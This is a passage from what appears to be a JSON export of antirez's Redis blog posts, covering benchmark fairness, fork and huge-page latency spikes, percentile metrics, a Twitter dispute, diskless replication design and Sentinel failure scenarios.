your main project because of side projects, but when this happens it is not because your side project captured your focus, it is because you managed to find a better use for your time, since the side project is more important, interesting, and compelling than the main project.  Redis is six years old today, but is aging well: it continues to capture the attention of more developers, and it continues to improve in order to provide a bit more value to users every week. However for me, more users, more pull requests, and more pressure, does not mean to change my setup. What Redis is today is the sum of the work we put into it, and the endurance in the course of six years. To continue along the same path, I\u2019ll make sure to have a few side projects for the next years.  UPDATE: Damian Janowski provided an incredible present for the Redis community today, the renewed Redis.io web site is online now! http://redis.io. Thanks Damian!  HN comments here: https://news.ycombinator.com/item?id=9112250 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-02-26T12:48:06Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6465.3428744, "slug": "side-projects-54", "topics": []}}, {"model": "app.post", "pk": 55, "fields": {"title": "Why we don\u2019t have benchmarks comparing Redis with other DBs", "link": "http://antirez.com/news/85", "source": 1, "normalized_link": "antirez.com/news/85", "summary": "Redis speed could be one selling point for new users, so following the trend of comparative \u201cadvertising\u201d it should be logical to have a few comparisons at Redis.io. However there are two problems with this. One is of goals: I don\u2019t want to convince developers to adopt Redis, we just do our best in order to provide a suitable product, and we are happy if people can get work done with it, that\u2019s where my marketing wishes end. There is more: it is almost always impossible to compare different systems in a fair way.  When you compare two databases, to get fair numbers, they need to share *a lot*: data model, exact durability guarantees, data replication safety, availability during partitions, and so forth: often a system will score in a lower way than another system since it sacrifices speed to provide less \u201chey look at me\u201d qualities but that are very important nonetheless. Moreover the testing suite is a complex matter as well unless different database systems talk the same exact protocol: differences in the client library alone can contribute for large differences.  However there are people that beg to differ, and believe comparing different database systems for speed is a good idea anyway. For example, yesterday a benchmark of Redis and AerospikeDB was published here: http://lynnlangit.com/2015/01/28/lessons-learned-benchmarking-nosql-on-the-aws-cloud-aerospikedb-and-redis/.  I\u2019ll use this benchmark to show my point about how benchmarks are misleading beasts. In the benchmark huge EC2 instances are used, for some strange reason, since the instances are equipped with 244 GB of RAM (!). Those are R3.8xlarge instances. For my tests I\u2019ll use a more real world m3.medium instance.  Using such a beast of an instance Redis scored, in the single node case, able to provide 128k ops per second. My EC2 instance is much more limited, testing from another EC2 instance with Redis benchmark, not using pipelining, and with the same 100 bytes data size, I get 32k ops/sec, so my instance is something like 4 times slower, in the single process case.  Let\u2019s see with Redis INFO command how the system is using the CPU during this benchmark:  # CPU used_cpu_sys:181.78 used_cpu_user:205.05 used_cpu_sys_children:0.12 used_cpu_user_children:0.87 127.0.0.1:6379> info cpu  \u2026 after 10 seconds of test \u2026  # CPU used_cpu_sys:184.52 used_cpu_user:206.42 used_cpu_sys_children:0.12 used_cpu_user_children:0.87  Redis spent ~ 3 seconds of system time, and only ~ 1.5 seconds in user space. What happens here is that for each request the biggest part of the work is to perform the read() and write() call. Also since it\u2019s one-query one-reply workload for each client, we pay a full RTT for each request of each client.  Now let\u2019s check what happens if I use pipelining instead, a feature very known and much exploited by Redis users, since it\u2019s the only way to maximize the server usage, and there are usually a number of places in the application where you can perform multiple operations at a given time.  With a pipeline of 32 operations the numbers changed drastically. My tiny instance was able to deliver 250k ops/sec using a single core, which is 25% of the *top* result using 32 (each faster) cores in the mentioned benchmark.  Let\u2019s look at the CPU time:  # CPU used_cpu_sys:189.16 used_cpu_user:216.46 used_cpu_sys_children:0.12 used_cpu_user_children:0.87 127.0.0.1:6379> info cpu  \u2026 after 10 seconds of test \u2026  # CPU used_cpu_sys:190.60 used_cpu_user:224.92 used_cpu_sys_children:0.12 used_cpu_user_children:0.87  This time we are actually using the database engine to serve queries with our CPU, we are not just losing much of the time context switching. We used ~1.5 seconds of system time, and 8.46 seconds into the Redis process itself.  Using lower numbers in the pipeline gets us results in the middle. Pipeline of 4 = 100k ops/sec (that should translate to ~ 400k ops/sec in the bigger instance used in the benchmark), pipeline 8 = 180k ops/sec, and so forth.  So basically it is not a coincidence that benchmarking Redis and AerospikeDB in this way we get remarkably similar results. More or less you are not testing the databases, but the network stack and the kernel. If the DB can serve queries using a read and a write system call without any other huge waste, this is what we get, and here the time to serve the actual query is small since we are talking about data fitting into memory (just a note, 10M keys of 100k in Redis will use a fraction of the memory that was allocated in those instances).  However there is more about that. What about the operations we can perform? To test Redis doing GET/SET is like to test a Ferrari checking how good it is at cleaning the mirror when it rains.  A fundamental part of the Redis architecture is that largely different operations have similar costs, so what about our huge Facebook game posting scores of the finished games to create the leaderboard?  The same single process can do 110k ops/sec when the query is: ZADD myscores  .  But let\u2019s demand more, what about estimating the cardinality with the HyperLogLog, at the same time adding new elements and reading the current guess with two redis-benchmark processes? Set size is 10 millions again. So during this test I spawned a benchmark executing PFADD with random elements of the set, and another doing PFCOUNT at the same time in the same HyperLogLog. Both scored simultaneously at 250k ops/sec, for a total of half a million ops per second with a single Redis process.  In Redis doing complex operations is similar to pipelining. You want to do *more* for each read/write, otherwise your performance is dominated by I/O.  Ok, so a few useful remarks. 1) GET/SET Benchmarks are not a great way to compare different database systems. 2) A better performance comparison is by use case. You say, for a given specific use case, using different data model, schema, queries, strategies, how much instances I need to handle the same traffic for the same app with two different database systems? 3) Test with instance types most people are going to actually use, huge instance types can mask inefficiencies of certain database systems, and is anyway not what most people are going to use.  We\u2019ll continue to optimize Redis for speed, and will continue to avoid posting comparative benchmarks.  [Thanks to Amazon AWS for providing me free access to EC2] Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-01-29T09:21:41Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6411.3076522, "slug": "why-we-dont-have-benchmarks-comparing-redis-with-other-dbs-55", "topics": []}}, {"model": "app.post", "pk": 56, "fields": {"title": "Redis latency spikes and the Linux kernel: a few more details", "link": "http://antirez.com/news/84", "source": 1, "normalized_link": "antirez.com/news/84", "summary": "Today I was testing Redis latency using m3.medium EC2 instances. I was able to replicate the usual latency spikes during BGSAVE, when the process forks, and the child starts saving the dataset on disk. However something was not as expected. The spike did not happened because of disk I/O, nor during the fork() call itself.  The test was performed with a 1GB of data in memory, with 150k writes per second originating from a different EC2 instance, targeting 5 million keys (evenly distributed). The pipeline was set to 4 commands. This translates to the following command line of redis-benchmark:      ./redis-benchmark -P 4 -t set -r 5000000 -n 1000000000  Every time BGSAVE was triggered, I could see ~300 milliseconds latency spikes of unknown origin, since fork was taking 6 milliseconds. Fortunately Redis has a software watchdog feature, that is able to produce a stack trace of the process during a latency event. It\u2019s quite a simple trick but works great: we setup a SIGALRM to be delivered by the kernel. Each time the serverCron() function is called, the scheduled signal is cleared, so actually Redis never receives it if the control returns fast enough to the Redis process. If instead there is a blocking condition, the signal is delivered by the kernel, and the signal handler prints the stack trace.  Instead of getting stack traces with the fork call, the process was always blocked near MOV* operations happening in the context of the parent process just after the fork. I started to develop the theory that Linux was \u201clazy forking\u201d in some way, and the actual heavy stuff was happening later when memory was accessed and pages had to be copy-on-write-ed.  Next step was to read the fork() implementation of the Linux kernel. What the system call does is indeed to copy all the mapped regions (vm_area_struct structures). However a traditional implementation would also duplicate the PTEs at this point, and this was traditionally performed by copy_page_range(). However something changed\u2026 as an optimization years ago: now Linux does not just performs lazy page copying, as most modern kernels. The PTEs are also copied in a lazy way on faults. Here is the top comment of copy_range_range():           * Don't copy ptes where a page fault will fill them correctly.          * Fork becomes much lighter when there are big shared or private          * readonly mappings. The tradeoff is that copy_page_range is more          * efficient than faulting.  Basically as soon as the parent process performs an access in the shared regions with the child process, during the page fault Linux does the big amount of work skipped by fork, and this is why I could see always a MOV instruction in the stack trace.  While this behavior is not good for Redis, since to copy all the PTEs in a single operation is more efficient, it is much better for the traditional use case of fork() on POSIX systems, which is, fork()+exec*() in order to spawn a new process.  This issue is not EC2 specific, however virtualized instances are slower at copying PTEs, so the problem is less noticeable with physical servers.  However this is definitely not the full story. While I was testing this stuff in my Linux box, I remembered that using the libc malloc, instead of jemalloc, in  certain conditions I was able to measure less latency spikes in the past. So I tried to check if there was some relation with that.  Indeed compiling with MALLOC=libc I was not able to measure any latency in the physical server, while with jemalloc I could observe the same behavior observed with the EC2 instance. To understand better the difference I setup a test with 15 million keys and a larger pipeline in order to stress more the system and make more likely that page faults of all the mmaped regions could happen in a very small interval of time. Then I repeated the same test with jemalloc and libc malloc:  bare metal, 675k/sec writes to 15 million keys, jemalloc: max spike 339 milliseconds. bare metal, 675k/sec writes to 15 million keys, malloc: max spike 21 milliseconds.  I quickly tried to replicate the same result with EC2, same stuff, the spike was a fraction with malloc.  The next logical thing after this findings is to inspect what is the difference in the memory layout of a Redis system running with libc malloc VS one running with jemalloc. The Linux proc filesystem is handy to investigate the process internals (in this case I used /proc//smaps file).  Jemalloc memory is allocated in this region:  7f8002c00000-7f8062400000 rw-p 00000000 00:00 0 Size:            1564672 kB Rss:             1564672 kB Pss:             1564672 kB Shared_Clean:          0 kB Shared_Dirty:          0 kB Private_Clean:         0 kB Private_Dirty:   1564672 kB Referenced:      1564672 kB Anonymous:       1564672 kB AnonHugePages:   1564672 kB Swap:                  0 kB KernelPageSize:        4 kB MMUPageSize:           4 kB Locked:                0 kB VmFlags: rd wr mr mw me ac sd  While libc big region looks like this:  0082f000-8141c000 rw-p 00000000 00:00 0                                  [heap] Size:            2109364 kB Rss:             2109276 kB Pss:             2109276 kB Shared_Clean:          0 kB Shared_Dirty:          0 kB Private_Clean:         0 kB Private_Dirty:   2109276 kB Referenced:      2109276 kB Anonymous:       2109276 kB AnonHugePages:         0 kB Swap:                  0 kB KernelPageSize:        4 kB MMUPageSize:           4 kB Locked:                0 kB VmFlags: rd wr mr mw me ac sd  Looks like here there are a couple different things.  1) There is [heap] in the first line only for libc malloc. 2) AnonHugePages field is zero for libc malloc but is set to the size of the region in the case of jemalloc.   Basically, the difference in latency appears to be due to the fact that malloc is using transparent huge pages, a kernel feature that allows to transparently glue multiple normal 4k pages into a few huge pages, which are 2048k each. This in turn means that copying the PTEs for this regions is much faster.   EDIT: Unfortunately I just spotted that I'm totally wrong, the huge pages apparently are only used by jemalloc: I just mis-read the outputs since this seemed so obvious. So on the contrary, it appears that the high latency is due to the huge pages thing for some unknown reason. So actually it is malloc that, while NOT using huge pages, is going much faster. I've no idea about what is happening here, so please disregard the above conclusions.   Meanwhile for low latency applications you may want to build Redis with \u201cmake MALLOC=libc\u201d, however make sure to use \u201cmake distclean\u201d before, and be aware that depending on the work load, libc malloc suffers fragmentation more than jemalloc.   More news soon\u2026  EDIT2: Oh wait... since the problem is huge pages, this is MUCH better, since we can disable it. And I just verified that it works:  echo never > /sys/kernel/mm/transparent_hugepage/enabled  This is the new Redis mantra apparently.  UPDATE: While this seemed unrealistic to me, I experimentally verified that the huge pages memory spike is due to the fact that with 50 clients writing at the same time, with N queued requests each, the Redis process can touch in the space of *a single event loop iteration* all the process pages, so its copy-on-writing the entire process address space. This means that not only huge pages are horrible for latency, but that are also horrible for memory usage. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-11-03T15:58:19Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6244.7964967, "slug": "redis-latency-spikes-and-the-linux-kernel-a-few-more-details-56", "topics": []}}, {"model": "app.post", "pk": 57, "fields": {"title": "Redis latency spikes and the 99th percentile", "link": "http://antirez.com/news/83", "source": 1, "normalized_link": "antirez.com/news/83", "summary": "One interesting thing about the Stripe blog post about Redis is that they included latency graphs obtained during their tests. In order to persist on disk Redis requires to call the fork() system call. Usually forking using physical servers, and most hypervisors, is fast even with big processes. However Xen is slow to fork, so with certain EC2 instance types (and other virtual servers providers as well), it is possible to have serious latency spikes every time the parent process forks in order to persist on disk. The Stripe graph is pretty clear in this regard.  img://antirez.com/misc/stripe-latency.png  As you can guess, if you perform a latency test during the fork, all the requests crossing the moment the parent process forks will be delayed up to one second (taking as example the graph above, not sure about what was the process size nor the EC2 instance). This will produce a number of samples with high latency, and will affect the 99th percentile result.  To change instance type, configuration, setup, or whatever in order to improve this behavior is a good idea, and there are use cases where even a single request having a too high latency is unacceptable. However apparently it is not obvious how latency spikes of 1 second every 30 minutes (or more, if you use AOF with the right rewrite triggers) is very different from latency spikes which are evenly distributed in the set of requests.  With evenly distributed spikes, if the generation of a page needs to perform a number of requests to a Redis server in order to create the output, it is very likely that a page view will incur in the latency penalty: this impacts the quality of service in a great way potentially, check this link: http://latencytipoftheday.blogspot.it/2014/06/latencytipoftheday-most-page-loads.html.  However 1 second of latency every 30 minutes run is a completely different thing. For once, the percentile with good latency gets better *as the number of requests increase*, since the more the requests are, the more this second of latency will be unlikely to get over-represented in the samples (if you have just 1 request per minute, and one of those requests happen to hit the high latency, it will affect the 99.99th percentile much more than what happens with 100 requests per second).  Second: most page views will be unaffected. The only users that will see the 1 second delay are the ones that make a request crossing the fork call. All the other requests will experience an extremely low probability of hitting a request that has a latency which is significantly worse than the average latency. Also note that a page view crossing the fork time, even when composed of 100 requests, can\u2019t be delayed for more than a second, since the requests are completed as soon as the fork() call terminates.  The bottom line here is that, if there are hard latency requirements for each single request, it is clear that a setup where a request can be delayed 1 second from time to time is a big problem. However when the goal is to provide a good quality of service, the distribution of the latency spikes have a huge effect on the outcome. Redis latency spikes due to fork on Xen are isolated points in the line of time, so they affect a percentage of page views, even when the page views are composed of a big number of Redis requests, which is proportional to the latency spike total time percentage, which is, 1 second every 1800 seconds in this case, so only the 0.05% of the page views will be affected.  Latency characteristics are hard to capture with a single metric: the full percentile curve and the distribution of the spikes, can provide a better picture. In general good rule of thumbs are a good way to start a research, and in general it is true that the average latency is a poor metric. However to promote a rule of thumb into an absolute truth has also its disadvantages, since many complex things remain complex, and in need for close inspection, regardless of our willingness to over simplify them.  At the same time, fork delays in EC2 instances are one of the worst experiences for Redis users in one of the most popular runtime environments today, so I\u2019m starting to test Redis with EC2 regularly now: we\u2019ll soon have EC2 specific optimization pages on the Redis official documentation, and a way to operate master-slaves replicas with persistence disabled in a safer way.  If you need EC2 + Redis master with persistence disabled now, the simplest to deploy \u201cquick fix\u201d is to disable automatic restarts of Redis instances, and use Sentinel for failover, so that crashed masters will not automatically return available, and will be failed over by Sentinel. The system administrator can restart the master manually after checking that the failover was successful and there is a new active master.  EDIT: Make sure to check the Hacker News thread that contains interesting information about EC2, Xen and fork time: https://news.ycombinator.com/item?id=8532851. Also not all the EC2 instances are the same, and certain types provide great fork time on pair with bare metal systems: https://redislabs.com/blog/testing-fork-time-on-awsxen-infrastructure#.VFJQ-JPF8yF Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/stripe-latency.png", "profile": 4, "updated_on": "2014-10-30T13:28:42Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6236.9170078, "slug": "redis-latency-spikes-and-the-99th-percentile-57", "topics": []}}, {"model": "app.post", "pk": 58, "fields": {"title": "This is why I  can\u2019t have conversations using Twitter", "link": "http://antirez.com/news/82", "source": 1, "normalized_link": "antirez.com/news/82", "summary": "Yesterday Stripe engineers wrote a detailed report of why they had an issue with Redis. This is very appreciated. In the Hacker News thread I explained that because now we have diskless replication (http://antirez.com/news/81) now persistence is no longer mandatory for people having a master-slaves replicas set. This changes the design constraints: now that we can have diskless replicas synchronization, it is worth it to better support the Stripe (ex?) use case of replicas set with persistence turned down, in a more safe way. This is a work in progress effort.  In the same post Stripe engineers said that they are going to switch to PostgreSQL for the use case where they have issues with Redis, which is a great database indeed, and many times if you can go with the SQL data model and an on-disk database, it is better to use that instead of Redis which is designed for when you really want to scale to a lot of complex operations per second. Stripe engineers also said that they measured the 99th percentile and it was better with PostgreSQL compared to Redis, so in a tweet @aphyr wrote:  \u201cNote that *synchronous* Postgres replication *between AZs* delivers lower 99th latencies than asynchronous Redis\u201d  And I replied:  \u201cIt could be useful to look at average latency to better understand what is going on, since I believe the 99% percentile is very affected by the latency spikes that Redis can have running on EC2.\u201d  Which means, if you have also the average, you can tell if the 99th percentile is ruined (or not) by latency spikes, that many times can be solved. Usually it is as simple as that: if you have a very low average, but the 99th percentile is bad, likely it is not that Redis is running slow because, for example, operations performed are very time consuming or blocking, but instead a subset of queries are served slow because of the usual issues in EC2: fork time in certain instances, remote disks I/O, and so forth. Stuff that you can likely address, since for example, there are instance types without the fork latency issue.  For half the Twitter IT community, my statement was to promote the average latency as the right metric over 99th percentiles:  \"averages are the worst possible metric for latency. No latency I've ever seen falls on a bell curve. Averages give nonsense.\"  \"You have clearly not understood how the math works or why tail latencies matter in dist sys. I think we're done here.\"  \u201cindeed; the problem is that averages are not robust in the presence of outliers\u201d  Ehm, who said that average is a good metric? I proposed it to *detect* if there are or not big outliers. So during what was supposed to be a normal exchange, I find after 10 minutes my Twitter completely full of people that tell me that I\u2019m an idiot to endorse averages as The New Metric For Latency in the world. Once you get the first retweets, you got more and more. Even a notable builder of other NoSQL database finds the time to lecture me a few things via Twitter: I reply saying that clearly what I wrote was that if you have 99th + avg you have a better picture of the curve and can understand if the problem is the Redis spikes on EC2, but magically the original tweet gets removed, so my tweets are now more out of context. My three tweets:  1. \u201cmay point was, even if in the internet noise I'm not sure if it is still useful, that avg helps to understand why (\u2026)\u201d 2. \u201cthe 99% percentile is bad. If avg is very good but 99% percentile is bad, you can suspect a few very bad samples\u201d 3. \u201cthis is useful with Redis, since with proper config sometimes you can improve the bad latency samples a lot.\u201d  Guess what? There is even somebody that isolated tweet #2 that was the continuation of \u201cto understand why the 99% percentile is bad\u201d (bad as in, is not providing good figures), and just read it out of context: \u201cthe 99% percentile is bad\u201d.  Once upon a time, people used to argue for days on usenet, but at least there was, most of the times, an argument against a new argument and so forth, with enough text and context to have a normal condition. This instead is just amplification of hate and engineering rules 101 together. 99th latency is the right metric and average is a poor one? Make sure to don\u2019t talk about averages even in a context where it makes sense otherwise you get 10000 shitty replies.  What to do with that? Now a good thing about me is that I\u2019m not much affected by all this personally, but it is also clear that because I use Twitter for a matter of work, in order to inform people of what is happening with Redis, this is not a viable working environment. For example, latency: I care a lot about latency, so many efforts were done during the years in order to improve it (including diskless replication). We have monitoring as well in order to understand if and why there are latency spikes, Redis can provide you an human readable report of what is happening inside of it by monitoring different execution paths. After all this work, what you get instead is the wrong message retweeted one million times, which does not help. Most people will not follow the tweets to make an idea themselves, the reality is, at this point, rewritten: I said that average percentile is good and I don\u2019t realize that you should look at the long tail. Next time I\u2019ll talk about latency, for many people, I\u2019ll be the one that has a few non clear ideas about it, so who knows what I\u2019m talking about or what I\u2019m doing?  At the same time Twitter is RSS for humans, it is extremely useful to keep many people updated about what I love to do, which is, to work to my open source project that so far I tried to develop with care. So I\u2019m trying to think about what a viable setup can be. Maybe I can just blog more, and use the Redis mailing list more, and use Twitter just to link stuff so that interested people can read, and interested people can argue and have real and useful discussions.  I\u2019ve a lot of things to do about Redis, for the users that have a good time with it, and a lot of things to do for the users that are experiencing problems. I feel like my time is best spent hacking instead of having non-conversations on Twitter. I love to argue, but this is just a futile exercise. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-10-29T09:17:04Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6234.6614967, "slug": "this-is-why-i-cant-have-conversations-using-twitter-58", "topics": []}}, {"model": "app.post", "pk": 59, "fields": {"title": "Diskless replication: a few design notes.", "link": "http://antirez.com/news/81", "source": 1, "normalized_link": "antirez.com/news/81", "summary": "Almost a month ago a number of people interested in Redis development met in London for the first Redis developers meeting. We identified together a number of features that are urgent (and are now listed in a Github issue here: https://github.com/antirez/redis/issues/2045), and among the identified issues, there was one that was mentioned multiple times in the course of the day: diskless replication.  The feature is not exactly a new idea, it was proposed several times, especially by EC2 users that know that sometimes it is not trivial for a master to provide good performances during slaves synchronization. However there are a number of use cases where you don\u2019t want to touch disks, even running on physical servers, and especially when Redis is used as a cache. Redis replication was, in short, forcing users to use disk even when they don\u2019t need or want disk durability.  When I returned back home I wanted to provide a quick feedback to the developers that attended the meeting, so the first thing I did was to focus on implementing the feature that seemed the most important and non-trivial among the list of identified issues. In the next weeks the attention will be moved to the Redis development process as well: the way issues are handled, how new ideas can be proposed to the Redis project, and so forth. Sorry for the delay about these other important things, for now what you can get is, some code at least ;-)  Diskless replication provided a few design challenges. It looks trivial but it is not, so since I want to blog more, I thought about documenting how the internals of this feature work. I\u2019m sure that a blog post may make the understanding and adoption of the new feature simpler.  How replication used to work ===  Newer versions of Redis are able, when the connection with the master is lost, to reconnect with the master, and continue the replication process in an incremental way just fetching the differences accumulated so far. However when a slave is disconnected for a long time, or restarted, or it is a new slave, Redis requires it to perform what is called a \u201cfull resynchronization\u201d.  It is a trivial concept, and means: in order to setup this slave, let\u2019s transfer *all* the master data set to the slave. It will flush away its old data, and reload the new data from scratch, making sure it is running an exact copy of master\u2019s data. Once the slave is an exact copy of the master, successive changes are streamed as a normal Redis commands, in an incremental way, as the master data set itself gets modified because of write commands sent by clients.  The problem was the way this initial \u201cbulk transfer\u201d needed for a full resynchronization was performed. Basically a child process was created by the master, in order to generate an RDB file. When the child was done with the RDB file generation, the file was sent to slaves, using non blocking I/O from the parent process. Finally when the transfer was complete, slaves could reload the RDB file and go online, receiving the incremental stream of new writes.  However this means that from the master point of view, in order to perform a full sync, we need:  1) To write the RDB on disk. 2) To load back the RDB from disk in order to send it to slaves.  \u201c2\u201d is not great but \u201c1\u201d is much worse. If AOF is active at the same time, for example, the AOF fsync() can be delayed a lot by the child writing to the disk as fast as possible. With the wrong setup, especially with non-local disks, but sometimes even because of a non perfect kernel parameters tuning, the disk pressure was cause of latency spikes that are hard to deal with. Partial resynchronizations introduced with Redis 2.8 mitigated this problem a bit, but from time to time you have to restart your slaves, or they go offline for too much time, so it is impossible to avoid full resynchronizations.  At the same time, this process had a few advantages. The RDB saving code was reused for replication as well, making the replication code simpler. Moreover while the child was producing the RDB file, new slaves could attach, and put in a queue: when the RDB was ready, we could feed multiple slaves at the same time.  All in all in many setups it works great and allows to synchronize a number of slaves at the same time. Also many users run with RDB persistence enabled in the master side, but not AOF, so anyway to persist on disk was happening from time to time. Most bare-metal users don\u2019t have any latency at all while Redis is persisting, moreover disks, especially local disks, have easy to predict performances: once the child starts to save, you don\u2019t really need to check for timeouts or if it is taking too much time, it will end eventually, and usually within a reasonable amount time.  For this reasons, disk-backed replication is *still* the default replication strategy, and there are no plans to remove it so far, but now we have an alternative in order to serve the use cases where it was not great.  So what is diskless replication? It is the idea that you can write directly from the child process to the slaves, via socket, without any intermediate step.  Sockets are not disks ===  The obvious problem about diskless replication is that writing to disks is different than writing to sockets. To start the API is different, since the RDB code used to write to C FILE pointers, while to write to sockets is a matter of writing to file descriptors. Moreover disk writes don\u2019t fail if not for hard I/O errors (for example if the disk is full), so when a write fails, you can consider the process aborted. For sockets it is different since writes can be delayed since the receiver is slow and the local kernel buffer is full. Another interesting issue is that there is to deal with timeouts: what about the receiving side to experience a failure so that it stops reading from us? Or just the TCP connection is dead but we don\u2019t get resets, and so forth. We can\u2019t take the child sending the RDB file to slaves active forever, there must be a way to detect timeouts.  Fortunately modifying the RDB code to write to file descriptors was trivial, because for an entirely different problem (MIGRATE/RESTORE for Redis Cluster) the code was already using an abstraction called \u201crio\u201d (redis I/O), that abstracts the serialization and deserialization of Redis values in RDB format, so you can write a value to the disk, or to an in memory buffer. What I did was to support a new \u201crio\u201d target, called fdset: a set of file descriptors. This is because as I\u2019ll write later, we need to write to multiple file descriptors at the same time.  However this was not enough. One of the main design tradeoffs was to understand if the in memory RDB transfer would happen in one of the following two ways:  1) Way #1: produce a full RDB file in memory inside a buffer, than transfer it. 2) Way #2: directly write to slaves sockets, incrementally, as the RDB was created.  Way #1 is a lot simpler since it is basically like the on-disk writing stuff, but in a kind of RAM disk. However the obvious risk is using too much memory. Way #2 is a bit more risky, because you have to transfer while the child producing the RDB file is active. However the essence of the feature was to target environments with slow disks perhaps, but *with fast networks*, without requiring too much additional memory, otherwise the feature risks to be useless. So Way #2 was selected.  However if you stream an RDB file like this, there is a new problem to solve\u2026 how will the slave understand that EOF is reached? We don\u2019t know, when we start the transfer, how big the transfer will be. With on-disk replication instead the size was known, so the transfer happened using just a Redis protocol \u201cbulk\u201d string, with prefixed length. Something like:  $92384923423\\r\\n \u2026 data follows \u2026  I was too lazy to implement some complex chunked protocol to announce incremental blocks sizes, so went for a more brute force approach. The master generates an unguessable and unlikely to collide 160 bits random string, and sends something like that to the slave:  $EOF:796f255829a040e80168f94c9fe7eda16b35e5df\\r\\n \u2026 data follows \u2026 796f255829a040e80168f94c9fe7eda16b35e5df  So basically this string, which is guaranteed (just because of infinitesimal probability) to never collide with anything inside the file, is used as the end of file mark. Trivial but works very well, and is simple.  For timeouts, since it is a blocking write process (since we are in the context of the saving child process), I just used the SO_SNDTIMEO socket option. This way we are sure that we need to make progresses, otherwise the replication process is aborted. So for now there is no way to have an hard time limit for the child lifespan, and there are in theory pathological conditions where the slave would accept just one byte every timeout-1 seconds, to create a very slow transfer setup. Probably in the future the child will monitor the transfer rate, and if it drops under a reasonable figure, will exit with an error.  Serving multiple slaves at the same time ===  Another goal of this implementation was to be able to serve multiple slaves at the same time. At first this looks impossible since once the RDB transfer starts, new slaves can\u2019t attach, but need to wait for the current child to stop and a new one to start.  However there is a very simple trick that covers a lot of use cases, which is, once the first slave want to replicate, we wait a few seconds for others to arrive as well. This covers the obvious case of a mass resync from multiple slaves for example.  Because of this, the I/O code was designed in order to write to multiple file descriptors at the same time. Moreover in order to parallelize the transfer even if blocking I/O is used, the code tries to write a small amount of data to each fd in a loop, so that the kernel will send the packets in the background to multiple slaves at the same time.  Probably the code itself is pretty easy to understand:      while(len) {         size_t count = len < 1024 ? len : 1024;         int broken = 0;         for (j = 0; j < r->io.fdset.numfds; j++) {             \u2026 error checking removed \u2026              /* Make sure to write 'count' bytes to the socket regardless              * of short writes. */             size_t nwritten = 0;             while(nwritten != count) {                 retval = write(r->io.fdset.fds[j],p+nwritten,count-nwritten);                 if (retval <= 0) {                      \u2026 error checkign removed \u2026                 }                 nwritten += retval;             }         }         p += count;         len -= count;         r->io.fdset.pos += count;         \u2026 more error checking removed \u2026     }  Note that writes are bufferized by the rio.c write target, since we want to write only when a given amount of data is available, otherwise we risk to send TCP packets with 5 bytes of data inside.  Handling partial failures ===  Handling multiple slaves is not just writing to multiple FDs, which is quite simple. A big part of the story is actually to handle a few slaves failing without requiring to block the process for all the other slaves. File descriptors in error are marked with the related error code, and no attempt is made to write to them again. Also the code detects if all the FDs are in error, and abort the process at all.  However when the RDB writing is terminated, the child needs to report what are the slaves that received the RDB and can continue the replication process. For this task, a unix pipe is used between the processes. The child returns an array of slave IDs and associated error state, so that the parent can do a decent job at logging errors as well.  How this changes Redis is a more deep way I thought ===  Diskless replication finally allows for a totally disk-free experience in Redis master-slaves sets. This means we need to support this use case better. Currently replication is dangerous to run with persistence disabled, since I thought there was not a case for turning off persistence when anyway replication was going to trigger it. But now this changed\u2026 and as a result, there are already plans to support better replication in a non-disk backed environment. The same will be applied to Redis Cluster as well\u2026 which is also a good candidate for diskless operations, especially for caching use cases, where replicas can do a good job to provide data redundancy, but where it may not be too critical if crash-restart of multiple instances cause data loss of a subset of hash slots in the cluster.  ETA ===  The code is already available in beta here: https://github.com/antirez/redis/commits/memsync It will be merged into unstable in the next days, but the plan is to wait a bit for feedbacks and bug reports, and later merge into 3.0 and 2.8 as well. The feature is very useful and it has little interactions with the rest of the Redis core when it is turned off. The plan is to just back port it everywhere and release it as \u201cexperimental\u201d for some time. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-10-27T16:34:15Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6231.4044078, "slug": "diskless-replication-a-few-design-notes-59", "topics": []}}, {"model": "app.post", "pk": 60, "fields": {"title": "A few arguments about Redis Sentinel properties and fail scenarios.", "link": "http://antirez.com/news/80", "source": 1, "normalized_link": "antirez.com/news/80", "summary": "Yesterday distributed systems expert Aphyr, posted a tweet about a Redis Sentinel issue experienced by an unknown company (that wishes to remain anonymous):  \u201cOH on Redis Sentinel \"They kill -9'd the master, which caused a split brain...\" \u201cthen the old master popped up with no data and replicated the lack of data to all the other nodes. Literally had to restore from backups.\"  OMG we have some nasty bug I thought. However I tried to get more information from Kyle, and he replied that the users actually disabled disk persistence at all from the master process. Yep: the master was configured on purpose to restart with a wiped data set.  Guess what? A Twitter drama immediately started. People were deeply worried for Redis users. Poor Redis users! Always in danger.  However while to be very worried is a trait of sure wisdom, I want to take the other path: providing some more information. Moreover this blog post is interesting to write since actually Kyle, while reporting the problem with little context, a few tweets later was able to, IMHO, isolate what is the true aspect that I believe could be improved in Redis Sentinel, which is not related to the described incident, and is in my TODO list for a long time now.   But before, let\u2019s check a bit more closely the behavior of Redis / Sentinel about the drama-incident.  Welcome to the crash recovery system model ===  Most real world distributed systems must be designed to be resilient to the fact that processes can restart at random. Note that this is very different from the problem of being partitioned away, which is, the inability to exchange messages with other processes. It is, instead, a matter of losing state.  To be more accurate about this problem, we could say that if a distributed algorithm is designed so that a process must guarantee to preserve the state after a restart, and fails to do this, it is technically experiencing a bizantine failure: the state is corrupted, and the process is no longer reliable.  Now in a distributed system composed of Redis instances, and Redis Sentinel instances, it is fundamental that rebooted instances are able to restart with the old data set. Starting with a wiped data set is a byzantine failure, and Redis Sentinel is not able to recover from this problem.  But let\u2019s do a step backward. Actually Redis Sentinel may not be directly involved in an incident like that. The typical example is what happens if a misconfigured master restarts fast enough so that no failure is detected at all by Sentinels.  1. Node A is the master. 2. Node A is restarted, with persistence disabled. 3. Sentinels (may) see that Node A is not reachable\u2026 but not enough to reach the configured timeout. 4. Node A 